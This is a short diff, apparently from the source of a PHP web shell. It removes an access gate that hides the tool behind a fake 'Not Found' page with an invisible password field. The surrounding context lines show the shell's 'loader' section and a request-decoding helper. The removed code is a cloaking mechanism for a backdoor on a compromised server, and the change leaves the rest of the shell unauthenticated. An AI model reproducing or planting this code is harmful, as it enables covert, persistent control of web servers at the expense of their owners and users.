@@ -627,28 +627,6 @@ function filesize64($file){
 $sBuff = '';  	
 $p = getCrypt();
 
-# Validate now
-if ($config['sPass']){
-	@session_start();
-	if (!isset($_SESSION[ md5($_SERVER['HTTP_HOST']) ])){ 
-		if (isset($p['pa']) && (md5($p['pa']) === $config['sPass'])){ 
-			$_SESSION[ md5($_SERVER['HTTP_HOST']) ] = true; 
-		} else {
-			echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' .
-				 '<html><head>' .
-				 '<title>Not Found</title>' .
-				 '</head><body>' .
-				 '<h1>Not Found</h1>' .
-				 '<p>The requested URL ' . $_SERVER['HTTP_HOST'] . ' was not found on this server.</p>' .
-				 '</body>' .
-				 '<style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>' .
-				 '<center><form method=post><input type="password" name="pa"></form></center>' .
-				 '</html>';
-			exit;
-		}
-	}
-}
-	
 # Sections
 if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	$i = 0;
